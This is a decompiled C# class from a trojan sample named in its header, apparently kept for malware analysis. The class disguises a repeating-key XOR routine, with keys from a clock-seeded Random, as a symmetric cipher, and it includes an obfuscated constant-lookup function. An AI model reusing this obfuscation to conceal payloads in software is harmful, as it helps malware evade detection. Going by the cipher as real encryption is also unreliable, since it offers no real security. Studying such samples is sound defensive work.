// Decompiled with JetBrains decompiler
// Type: 
// Assembly: 0567471093200, Version=3.0.0.207, Culture=neutral, PublicKeyToken=null
// MVID: 117E2800-B57C-C236-95FE-8562A0D634EC
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Bsymem.gen-f8c026efe73008c21f243f37980841994e3102b5832a549747658fc2082f58b4.exe

using System;
using System.Security.Cryptography;

internal sealed class \uE009 : SymmetricAlgorithm, ICryptoTransform, IDisposable
{
  private Random \uE002;

  public \uE009()
  {
    this.\uE002 = new Random(DateTime.Now.Millisecond);
    this.LegalKeySizesValue = new KeySizes[1]
    {
      new KeySizes(128, 128, 0)
    };
    this.KeySize = 128;
    this.LegalBlockSizesValue = new KeySizes[1]
    {
      new KeySizes(128, 128, 0)
    };
    this.BlockSize = 128;
  }

  public override ICryptoTransform CreateEncryptor(byte[] _param1, byte[] _param2)
  {
    _param1.CopyTo((Array) this.Key, 0);
    _param2.CopyTo((Array) this.IV, 0);
    return (ICryptoTransform) this;
  }

  public override ICryptoTransform CreateDecryptor(byte[] _param1, byte[] _param2)
  {
    _param1.CopyTo((Array) this.Key, 0);
    _param2.CopyTo((Array) this.IV, 0);
    return (ICryptoTransform) this;
  }

  public override void GenerateIV()
  {
    byte[] buffer = new byte[16];
    this.\uE002.NextBytes(buffer);
    this.IV = buffer;
  }

  public override void GenerateKey()
  {
    byte[] buffer = new byte[16];
    this.\uE002.NextBytes(buffer);
    this.Key = buffer;
  }

  public int TransformBlock(
    byte[] _param1,
    int _param2,
    int _param3,
    byte[] _param4,
    int _param5)
  {
    int length1 = this.Key.Length;
    int length2 = this.IV.Length;
    for (int index = 0; index < _param3; ++index)
    {
      int num = (int) this.IV[index % length2];
      _param4[index + _param5] = (byte) ((uint) _param1[index + _param2] ^ (uint) this.Key[num % length1]);
    }
    return _param3;
  }

  public byte[] TransformFinalBlock(byte[] _param1, int _param2, int _param3)
  {
    byte[] numArray = new byte[_param3];
    this.TransformBlock(_param1, _param2, _param3, numArray, 0);
    return numArray;
  }

  public bool CanReuseTransform => true;

  public bool CanTransformMultipleBlocks => true;

  public int InputBlockSize => 16;

  public int OutputBlockSize => 16;

  internal static int \uE004(int _param0)
  {
    switch (_param0 - (~260346795 - -260346880))
    {
      case 0:
        return -(823294663 - 444275843 ^ -379018829);
      case 1:
        return (-1035701870 ^ -553748696) - 481953466;
      case 2:
        return -(-127783121 - -127783136);
      case 3:
        return (-44869182 - 532806116 ^ 577675614) >> 7 << 1;
      case 5:
        return (160182144 >> 2) - 40045534;
      case 6:
        return ~(1 << 2);
      case 7:
        return -~(640 >> 6);
      case 8:
        return -324629819 - -324629818;
      case 9:
        return 181393761 - 489624577 + 308231056 >> 4;
      case 10:
        return (-182006906 ^ 247346521) << 3 ^ -590874890;
      default:
        return -~(67058935 - -243577858) - 310636795;
    }
  }
}
